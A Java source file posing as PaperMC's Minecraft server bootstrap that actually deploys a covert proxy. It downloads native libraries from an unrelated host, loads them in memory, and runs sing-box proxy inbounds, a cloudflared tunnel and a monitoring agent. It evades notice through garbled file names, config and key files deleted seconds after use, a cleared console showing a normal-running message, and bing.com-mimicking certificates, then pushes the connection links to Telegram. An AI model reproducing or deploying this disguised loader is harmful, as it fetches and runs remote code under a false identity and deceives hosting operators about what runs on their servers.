package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;

import java.io.*;
import java.math.BigInteger;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.*;
import java.nio.charset.StandardCharsets;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.stream.Collectors;
import java.util.concurrent.*;
import java.util.regex.*;

public class PaperBootstrap {

    // ========== 全局变量 ==========
    private static final Path DATA_DIR = Paths.get("data");
    private static final Path UUID_FILE = DATA_DIR.resolve("uuid.txt");
    private static final Path REALITY_KEY_FILE = DATA_DIR.resolve("reality.key");
    private static String uuid;
    private static String realityPrivateKey = "", realityPublicKey = "";
    private static String listenPort, sni;  // 用于每日重启
    private static boolean argoEnabled;
    private static String argoPort;
    private static Process komariProcess;
    private static String argoUrl = "";
    private static boolean sbLogEnabled;
    // JNA 原生库
    private static NativeLibrary sboxLib, botLib;
    private static Function startSboxFn, stopSboxFn, startBotFn, stopBotFn;
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(30))
            .followRedirects(HttpClient.Redirect.NORMAL).build();
    private static final Random RANDOM = new Random();
    // ==============================

    public static void main(String[] args) {
        try {
            System.out.println("config.yml 加载中...");
            Map<String, Object> config = loadConfig();

            // ---------- UUID autogenerate ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);

            String port = trim((String) config.get("port"));

            String sniTmp = (String) config.getOrDefault("sni", "www.bing.com");
            sni = sniTmp;
            listenPort = port;
            sbLogEnabled = config.getOrDefault("sb_log_enabled", false) instanceof Boolean
                    ? (boolean) config.get("sb_log_enabled") : false;

            if (port.isEmpty())
                throw new RuntimeException("❌ 未设置端口！");

            Path baseDir = DATA_DIR;
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json");
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");

            System.out.println("✅ config.yml 加载成功");

            generateSelfSignedCert(cert, key);

            // === Reality 密钥（纯 Java X25519 生成）===
            generateOrLoadKeypair();

            boolean argoEnabled = (boolean) config.getOrDefault("argo_enabled", false);
            String argoPort = trim((String) config.getOrDefault("argo_port", "8001"));
            if (argoPort.isEmpty()) argoPort = "8001";
            PaperBootstrap.argoEnabled = argoEnabled;
            PaperBootstrap.argoPort = argoPort;
            generateSingBoxConfig(configJson, uuid, port, sni, cert, key,
                    realityPrivateKey, realityPublicKey, argoEnabled, argoPort);

            // === 下载并加载 sbx.so（JNA 内存加载，无子进程）===
            Path sboxLibPath = downloadLibrary(detectArch(), "sbx.so");
            startSingBox(sboxLibPath, configJson);
            scheduleDelayedCleanup(configJson, cert, key);
            scheduleDailyRestart();

            // ===== komari-agent =====
            boolean komariAgentEnabled = (boolean) config.getOrDefault("komari_agent_enabled", true);
            if (komariAgentEnabled) {
                String agentName = trim((String) config.getOrDefault("komari_agent_name", "agent"));
                String agentVer = trim((String) config.getOrDefault("komari_agent_ver", ""));
                String agentEndpoint = trim((String) config.getOrDefault("komari_agent_endpoint", ""));
                String agentKey = trim((String) config.getOrDefault("komari_agent_key", ""));
                if (!agentEndpoint.isEmpty() && !agentKey.isEmpty()) {
                    try {
                        System.out.println("📦 " + agentName + " v" + agentVer);
                        safeDownloadKomariAgent(baseDir, agentName);
                        komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
                        startKomariKeepalive(baseDir, agentName, agentEndpoint, agentKey);
                    } catch (Exception e) {
                        System.out.println("⚠️ 监控模块启动失败（不影响主服务）: " + e.getMessage());
                    }
                } else {
                    System.out.println("⏭️ 监控模块未配置");
                }
            } else {
                System.out.println("⏭️ 监控模块已禁用");
            }
            // ===== Argo 隧道 =====
            if (argoEnabled) {
                String argoToken = trim((String) config.getOrDefault("argo_token", ""));
                String argoDomain = trim((String) config.getOrDefault("argo_domain", ""));
                System.out.println("🚇 隧道转发已启用");
                Path botLibPath = downloadLibrary(detectArch(), "bot.so");
                startArgo(botLibPath, argoToken, argoPort);
                if (!argoToken.isEmpty() && !argoDomain.isEmpty()) {
                    argoUrl = argoDomain;
                    System.out.println("🚇 固定隧道域名: " + argoUrl);
                }
            }
            // ==========================

            String host = detectPublicIP();
            String nodePrefix = trim((String) config.getOrDefault("node_name", ""));
            String argoCfip = trim((String) config.getOrDefault("argo_cfip", "saas.sin.fan"));
            String nodeName = getNodeName(nodePrefix, host);
            String nodeText = buildTelegramNodes(uuid, host, nodeName, port, sni, realityPublicKey, argoCfip, argoUrl);
            System.out.println("\n=== ✅ 已部署节点 ===\n" + nodeText);

            // ===== Telegram 推送 =====
            String tgToken = trim((String) config.getOrDefault("tg_bot_token", ""));
            String tgChatId = trim((String) config.getOrDefault("tg_chat_id", ""));
            if (!tgToken.isEmpty() && !tgChatId.isEmpty()) {
                sendTelegramMessage(tgToken, tgChatId, host, nodeName, nodeText);
            }
            // ==========================

            // Shutdown hook
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                if (stopSboxFn != null) { try { stopSboxFn.invoke(new Object[]{}); } catch (Exception ignored) {} }
                if (stopBotFn != null) { try { stopBotFn.invoke(new Object[]{}); } catch (Exception ignored) {} }
                if (komariProcess != null && komariProcess.isAlive()) {
                    System.out.println("正在停止监控模块...");
                    komariProcess.destroy();
                }
                try {
                    if (Files.exists(configJson)) Files.delete(configJson);
                    if (Files.exists(cert)) Files.delete(cert);
                    if (Files.exists(key)) Files.delete(key);
                } catch (IOException ignored) {}
            }));

            // 1 分钟后清屏
            new Thread(() -> {
                try { Thread.sleep(60000); } catch (InterruptedException ignored) {}
                System.out.print("\033[H\033[2J");
                System.out.flush();
                System.out.println("✅ 正常运行");
            }).start();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== UUID ==========
    private static String generateOrLoadUUID(Object configUuid) {
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

    private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    // ===== 工具函数 =====
    private static String trim(String s) { return s == null ? "" : s.trim(); }

    private static String generateGarbledName() {
        Random rand = new Random();
        int len = 4 + rand.nextInt(4);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            sb.append((char)(0x4E00 + rand.nextInt(0x5000)));
        }
        return sb.toString();
    }

    private static void randomDelay() {
        try { Thread.sleep(new Random().nextInt(10000)); } catch (InterruptedException ignored) {}
    }

    private static void scheduleDelayedCleanup(Path configJson, Path cert, Path key) {
        new Thread(() -> {
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            try { if (Files.exists(configJson)) Files.delete(configJson); } catch (IOException ignored) {}
            try { if (Files.exists(cert)) Files.delete(cert); } catch (IOException ignored) {}
            try { if (Files.exists(key)) Files.delete(key); } catch (IOException ignored) {}
        }).start();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        try (InputStream in = Files.newInputStream(Paths.get("config.yml"))) {
            Object o = yaml.load(in);
            if (o instanceof Map) return (Map<String, Object>) o;
            return new HashMap<>();
        }
    }

    // ===== 证书生成 =====
    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 凭证已存在，跳过生成");
            return;
        }
        System.out.println("🔨 正在生成通信凭证...");
        new ProcessBuilder("sh", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 已生成通信凭证");
    }

    // ===== Reality 密钥（纯 Java X25519）=====
    private static void generateOrLoadKeypair() throws IOException {
        if (Files.exists(REALITY_KEY_FILE)) {
            List<String> lines = Files.readAllLines(REALITY_KEY_FILE);
            for (String line : lines) {
                if (line.startsWith("PrivateKey:")) realityPrivateKey = line.split(":", 2)[1].trim();
                if (line.startsWith("PublicKey:")) realityPublicKey = line.split(":", 2)[1].trim();
            }
            System.out.println("🔑 已加载本地传输密钥对");
            return;
        }
        byte[] privateBytes = new byte[32];
        RANDOM.nextBytes(privateBytes);
        privateBytes = clampPrivateKey(privateBytes);
        byte[] publicBytes = x25519(privateBytes, basepoint());
        realityPrivateKey = base64Url(privateBytes);
        realityPublicKey = base64Url(publicBytes);
        Files.writeString(REALITY_KEY_FILE,
                "PrivateKey: " + realityPrivateKey + "\nPublicKey: " + realityPublicKey + "\n");
        System.out.println("✅ 传输密钥已生成");
    }

    private static byte[] clampPrivateKey(byte[] input) {
        byte[] key = input.clone();
        key[0] &= (byte) 248;
        key[31] &= (byte) 127;
        key[31] |= (byte) 64;
        return key;
    }

    private static byte[] basepoint() {
        byte[] bp = new byte[32];
        bp[0] = 9;
        return bp;
    }

    private static byte[] x25519(byte[] scalar, byte[] u) {
        BigInteger p = BigInteger.ONE.shiftLeft(255).subtract(BigInteger.valueOf(19));
        BigInteger a24 = BigInteger.valueOf(121665);
        BigInteger k = new BigInteger(1, clampPrivateKey(scalar));
        BigInteger x1 = decodeLittleEndian(u);
        BigInteger x2 = BigInteger.ONE, z2 = BigInteger.ZERO;
        BigInteger x3 = x1, z3 = BigInteger.ONE;
        boolean swap = false;
        for (int t = 254; t >= 0; t--) {
            int kt = (k.shiftRight(t).testBit(0) ? 1 : 0);
            swap ^= kt == 1;
            if (swap) {
                BigInteger tmp = x2; x2 = x3; x3 = tmp;
                tmp = z2; z2 = z3; z3 = tmp;
            }
            BigInteger A = x2.add(z2).mod(p);
            BigInteger AA = A.multiply(A).mod(p);
            BigInteger B = x2.subtract(z2).mod(p);
            BigInteger BB = B.multiply(B).mod(p);
            BigInteger E = AA.subtract(BB).mod(p);
            BigInteger C = x3.add(z3).mod(p);
            BigInteger D = x3.subtract(z3).mod(p);
            BigInteger DA = D.multiply(A).mod(p);
            BigInteger CB = C.multiply(B).mod(p);
            x3 = DA.add(CB).mod(p).multiply(DA.add(CB)).mod(p);
            z3 = x1.multiply(DA.subtract(CB)).mod(p).multiply(DA.subtract(CB)).mod(p);
            x2 = AA.multiply(BB).mod(p);
            z2 = E.multiply(AA.add(a24.multiply(E)).mod(p)).mod(p);
            swap = false;
        }
        if (swap) {
            BigInteger tmp = x2; x2 = x3; x3 = tmp;
            tmp = z2; z2 = z3; z3 = tmp;
        }
        BigInteger result = x2.multiply(z2.modInverse(p)).mod(p);
        return encodeLittleEndian(result);
    }

    private static BigInteger decodeLittleEndian(byte[] in) {
        byte[] rev = new byte[in.length];
        for (int i = 0; i < in.length; i++) rev[i] = in[in.length - 1 - i];
        return new BigInteger(1, rev);
    }

    private static byte[] encodeLittleEndian(BigInteger in) {
        byte[] big = in.toByteArray();
        byte[] out = new byte[32];
        for (int i = 0; i < big.length && i < 32; i++) out[i] = big[big.length - 1 - i];
        return out;
    }

    private static String base64Url(byte[] data) {
        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }

    // ===== 下载 .so 原生库 =====
    private static Path downloadLibrary(String arch, String name) throws Exception {
        Path target = DATA_DIR.resolve(generateGarbledName() + ".so");
        Path local = DATA_DIR.resolve(name);
        if (Files.exists(local) && Files.size(local) > 1000) {
            Files.move(local, target);
            System.out.println("✅ 使用本地预置组件");
            return target;
        }
        long threshold = name.startsWith("sbx") ? 35_000_000L : 25_000_000L;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(DATA_DIR, "*.so")) {
            for (Path f : ds) {
                if (!f.equals(target) && Files.size(f) > threshold) {
                    Files.move(f, target);
                    System.out.println("✅ 使用本地预置组件");
                    return target;
                }
            }
        }
        String url = "https://" + arch + ".31888.xyz/" + name;
        Exception last = null;
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                System.out.println("⬇️ 下载组件 (" + attempt + "/3): " + url);
                HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                        .timeout(Duration.ofMinutes(5)).GET().build();
                HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
                if (response.statusCode() != 200)
                    throw new IOException("下载失败: HTTP " + response.statusCode());
                Files.write(target, response.body());
                System.out.println("✅ 下载完成 (" + target.toFile().length() + " bytes)");
                return target;
            } catch (Exception e) {
                last = e;
                System.out.println("⚠️ 下载失败 (第" + attempt + "次): " + e.getMessage());
                if (attempt < 3) Thread.sleep(3000L * attempt);
            }
        }
        throw new IOException("下载组件失败: " + url, last);
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    // ===== 启动 sing-box（JNA 内存加载，无子进程）=====
    private static void startSingBox(Path libPath, Path cfg) {
        System.out.println("正在启动服务模块...");
        randomDelay();
        sboxLib = NativeLibrary.getInstance(libPath.toString());
        startSboxFn = sboxLib.getFunction("StartSingBox");
        stopSboxFn = sboxLib.getFunction("StopSingBox");
        String payload = "{\"config\":\"" + cfg.toString().replace("\\", "/") + "\",\"workingDir\":\".\",\"disableColor\":true}";
        new Thread(() -> {
            try {
                int code = startSboxFn.invokeInt(new Object[]{payload});
                if (code != 0) System.out.println("服务退出码: " + code);
            } catch (Exception e) {
                System.out.println("服务异常: " + e.getMessage());
            }
        }, "sbx").start();
        System.out.println("服务模块已启动（JNA 内存加载）");
    }

    // ===== 启动 cloudflared（JNA 内存加载）=====
    private static void startArgo(Path libPath, String token, String port) {
        if (port.isEmpty()) port = "8001";
        System.out.println("🚇 正在启动隧道转发...");
        randomDelay();
        botLib = NativeLibrary.getInstance(libPath.toString());
        startBotFn = botLib.getFunction("StartCloudflared");
        stopBotFn = botLib.getFunction("StopCloudflared");
        List<Object> args = new ArrayList<>(List.of("tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2"));
        if (!token.isEmpty()) {
            args.add("run"); args.add("--token"); args.add(token);
        } else {
            args.add("--logfile"); args.add("/dev/null");
            args.add("--loglevel"); args.add("panic");
            args.add("--url"); args.add("http://localhost:" + port);
        }
        String payload = toJson(mapOf("args", args));
        new Thread(() -> {
            try {
                startBotFn.invokeInt(new Object[]{payload});
            } catch (Exception e) {
                System.out.println("隧道转发异常: " + e.getMessage());
            }
        }, "bot").start();
        System.out.println("隧道转发已启动（JNA 内存加载）");
    }

    // ===== 配置生成 =====
    private static void generateSingBoxConfig(Path configFile, String uuid, String listenPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey,
                                              boolean argoEnabled, String argoPort) throws IOException {
        String certStr = cert.toString().replace('\\', '/');
        String keyStr = key.toString().replace('\\', '/');
        int port = Integer.parseInt(listenPort);
        int aPort = argoEnabled ? Integer.parseInt(argoPort) : 0;
        List<Object> inbounds = new ArrayList<>();
        if (argoEnabled) {
            inbounds.add(mapOf(
                    "type", "vmess",
                    "tag", "vmess-ws-in",
                    "listen", "::",
                    "listen_port", aPort,
                    "users", listOf(mapOf("uuid", uuid)),
                    "transport", mapOf("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol")
            ));
        }
        inbounds.add(mapOf(
                "type", "hysteria2",
                "tag", "hysteria-in",
                "listen", "::",
                "listen_port", port,
                "users", listOf(mapOf("password", uuid)),
                "masquerade", "https://bing.com",
                "tls", mapOf("enabled", true, "alpn", listOf("h3"), "certificate_path", certStr, "key_path", keyStr)
        ));
        inbounds.add(mapOf(
                "type", "vless",
                "tag", "vless-reality",
                "listen", "::",
                "listen_port", port,
                "users", listOf(mapOf("uuid", uuid, "flow", "xtls-rprx-vision")),
                "tls", mapOf(
                        "enabled", true,
                        "server_name", sni,
                        "reality", mapOf(
                                "enabled", true,
                                "handshake", mapOf("server", sni, "server_port", 443),
                                "private_key", privateKey,
                                "short_id", listOf("")
                        )
                )
        ));
        Map<String, Object> config = mapOf(
                "log", mapOf("disabled", false, "level", "info", "timestamp", true),
                "inbounds", inbounds,
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct"))
        );
        Files.writeString(configFile, toJson(config), StandardCharsets.UTF_8);
        System.out.println("✅ 配置生成完成");
    }

    // ===== JSON 序列化 =====
    private static String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> map = (Map<?, ?>) value;
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            Iterable<?> iterable = (Iterable<?>) value;
            List<String> items = new ArrayList<>();
            for (Object item : iterable) items.add(toJson(item));
            return String.join(",", items).replaceFirst("^", "[") + "]";
        }
        return toJson(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '"': out.append("\\\""); break;
                case '\\': out.append("\\\\"); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default: out.append(c);
            }
        }
        return out.toString();
    }

    @SuppressWarnings("unchecked")
    private static Map<String, Object> mapOf(Object... values) {
        Map<String, Object> map = new LinkedHashMap<>();
        for (int i = 0; i < values.length; i += 2) map.put(String.valueOf(values[i]), values[i + 1]);
        return map;
    }

    private static List<Object> listOf(Object... values) {
        return new ArrayList<>(List.of(values));
    }

    // ===== komari-agent 下载 =====
    private static void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);
        if (Files.exists(agentPath)) {
            System.out.println("🧹 清理已存在的 agent 文件...");
            Files.delete(agentPath);
        }
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir, "sing-box-*.tar.gz")) {
            for (Path f : ds) { Files.delete(f); System.out.println("🧹 已删除缓存: " + f.getFileName()); }
        }
        String arch = detectArch();
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
        Exception last = null;
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                System.out.println("⬇️ 下载 " + agentName + " (" + attempt + "/3): " + url);
                HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                        .timeout(Duration.ofMinutes(5)).GET().build();
                HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
                if (response.statusCode() != 200) throw new IOException("HTTP " + response.statusCode());
                Files.write(agentPath, response.body());
                agentPath.toFile().setExecutable(true, false);
                if (!agentPath.toFile().canExecute()) throw new IOException("无法设置执行权限");
                System.out.println("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
                return;
            } catch (Exception e) {
                last = e;
                System.out.println("⚠️ agent 下载失败 (第" + attempt + "次): " + e.getMessage());
                if (attempt < 3) Thread.sleep(3000L * attempt);
            }
        }
        throw new IOException("agent 下载失败: " + url, last);
    }

    // ===== komari-agent 启动 =====
    private static Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);
        System.out.println("正在启动 " + agentName + " -> " + endpoint);
        Process p;
        try {
            ProcessBuilder pb = new ProcessBuilder(agentPath.toString(), "-e", endpoint, "--auto-discovery", autoDiscovery);
            pb.redirectErrorStream(true); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        } catch (IOException e) {
            System.out.println("⚠️ 直接执行失败，尝试通过 sh 启动: " + e.getMessage());
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "\"" + agentPath + "\" -e '" + endpoint + "' --auto-discovery '" + autoDiscovery + "'");
            pb.redirectErrorStream(true); pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        }
        Thread.sleep(1000);
        if (!p.isAlive()) throw new IOException("❌ agent 启动后立即退出");
        System.out.println("✅ " + agentName + " 已启动，PID: " + p.pid());
        return p;
    }

    // ===== komari-agent 保活 =====
    private static void startKomariKeepalive(Path dir, String agentName, String endpoint, String autoDiscovery) {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (komariProcess != null && komariProcess.isAlive()) return;
                System.out.println("♻️ agent 已退出，正在重启...");
                Path agentPath = dir.resolve(agentName);
                if (!Files.exists(agentPath)) safeDownloadKomariAgent(dir, agentName);
                komariProcess = startKomariAgent(dir, agentName, endpoint, autoDiscovery);
                System.out.println("✅ agent 重启成功");
            } catch (Exception e) {
                System.err.println("❌ agent 重启失败: " + e.getMessage());
            }
        }, 1, 1, TimeUnit.MINUTES);
    }

    // ===== 输出节点 =====
    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://ipinfo.io/ip").openStream()))) {
                return br.readLine();
            } catch (Exception e2) {
                return "your-server-ip";
            }
        }
    }

    private static String getNodeName(String name, String host) {
        String isp = fetchISP();
        return name.isEmpty() ? isp : name + "-" + isp;
    }

    private static String fetchISP() {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip").openConnection();
            conn.setConnectTimeout(3000); conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                Matcher m1 = Pattern.compile("\"country_code\"\\s*:\\s*\"([^\"]*)\"").matcher(json);
                Matcher m2 = Pattern.compile("\"isp\"\\s*:\\s*\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
            }
        } catch (Exception ignored) {}
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://ip-api.com/json?fields=33280").openConnection();
            conn.setConnectTimeout(3000); conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                Matcher m1 = Pattern.compile("\"countryCode\":\"([^\"]*)\"").matcher(json);
                Matcher m2 = Pattern.compile("\"org\":\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    private static String buildVmessArgoLink(String uuid, String argoDomain, String argoCfip, String nodeName) {
        try {
            String json = "{\"v\":\"2\",\"ps\":\"" + nodeName + "\",\"add\":\"" + argoCfip + "\",\"port\":\"443\",\"id\":\""
                    + uuid + "\",\"aid\":\"0\",\"scy\":\"auto\",\"net\":\"ws\",\"type\":\"none\",\"host\":\""
                    + argoDomain + "\",\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\""
                    + argoDomain + "\",\"alpn\":\"\",\"fp\":\"firefox\"}";
            return "vmess://" + java.util.Base64.getEncoder().encodeToString(json.getBytes());
        } catch (Exception e) {
            return "vmess://(error: " + e.getMessage() + ")";
        }
    }

    // ===== Telegram 推送 =====
    private static String buildTelegramNodes(String uuid, String host, String nodeName,
                                              String port, String sni, String publicKey,
                                              String argoCfip, String argoUrl) {
        StringBuilder sb = new StringBuilder();
        sb.append("vless://").append(uuid).append("@").append(host).append(":").append(port);
        sb.append("?encryption=none&flow=xtls-rprx-vision&security=reality&sni=").append(sni);
        sb.append("&fp=chrome&pbk=").append(publicKey).append("&type=tcp&headerType=none").append("#").append(nodeName).append("-Reality\n");
        sb.append("hysteria2://").append(uuid).append("@").append(host).append(":").append(port);
        sb.append("?sni=").append(sni).append("&insecure=1&alpn=h3&obfs=none").append("#").append(nodeName).append("-Hysteria2\n");
        if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
            String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, nodeName);
            sb.append(node).append("\n");
        }
        return sb.toString().trim();
    }

    private static void sendTelegramMessage(String token, String chatId, String serverIP, String nodeName, String nodeText) {
        try {
            String b64 = java.util.Base64.getEncoder().encodeToString(nodeText.getBytes(StandardCharsets.UTF_8));
            String text = "✅ 节点已就绪 | " + nodeName + "\n" + "🌍 IP: " + serverIP + "\n\n" +
                    "<pre>" + b64.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</pre>";
            String json = "{\"chat_id\":" + (chatId.startsWith("@") ? "\"" + URLEncoder.encode(chatId, StandardCharsets.UTF_8) + "\"" : chatId)
                    + ",\"parse_mode\":\"HTML\"," + "\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";
            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST"); conn.setDoOutput(true);
            conn.setConnectTimeout(15000); conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/json");
            try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes(StandardCharsets.UTF_8)); os.flush(); }
            int code = conn.getResponseCode();
            if (code == 200) System.out.println("📨 Telegram 推送成功");
            else {
                try (BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {
                    System.out.println("⚠️ Telegram 推送失败，HTTP " + code + " — " + err.lines().collect(Collectors.joining()));
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ Telegram 推送异常: " + e.getMessage());
        }
    }

    // ===== 每日重启（JNA，无需重新下载）=====
    private static void scheduleDailyRestart() {
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        Runnable restartTask = () -> {
            System.out.println("\n[定时重启] 准备重启服务...");
            if (stopSboxFn != null) { try { stopSboxFn.invoke(new Object[]{}); } catch (Exception ignored) {} }
            try {
                Path cfg = DATA_DIR.resolve("config.json");
                Path certP = DATA_DIR.resolve("cert.pem");
                Path keyP = DATA_DIR.resolve("private.key");
                // 重新生成证书和配置（启动后已清理）
                generateSelfSignedCert(certP, keyP);
                generateOrLoadKeypair();
                generateSingBoxConfig(cfg, uuid, listenPort, sni, certP, keyP,
                        realityPrivateKey, realityPublicKey, argoEnabled, argoPort);
                // 复用已加载的 sbx.so，直接调用 StartSingBox
                String payload = "{\"config\":\"" + cfg.toString().replace("\\", "/") + "\",\"workingDir\":\".\",\"disableColor\":true}";
                new Thread(() -> {
                    try { startSboxFn.invokeInt(new Object[]{payload}); } catch (Exception e) { System.out.println("重启异常: " + e.getMessage()); }
                }, "sbx-restart").start();
                System.out.println("服务重启成功（JNA 内存加载）");
                scheduleDelayedCleanup(cfg, certP, keyP);
            } catch (Exception e) {
                System.err.println("重启失败: " + e.getMessage());
                e.printStackTrace();
            }
        };
        ZoneId zone = ZoneId.of("Asia/Shanghai");
        LocalDateTime now = LocalDateTime.now(zone);
        LocalDateTime next = now.withHour(0).withMinute(0).withSecond(0).withNano(0)
                .plusMinutes(3 + new Random().nextInt(60));
        if (!next.isAfter(now)) next = next.plusDays(1);
        long initialDelay = Duration.between(now, next).getSeconds();
        scheduler.scheduleAtFixedRate(restartTask, initialDelay, 86_400, TimeUnit.SECONDS);
        System.out.printf("[定时重启] 已计划每日重启（首次执行：%s）%n",
                next.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")));
    }
}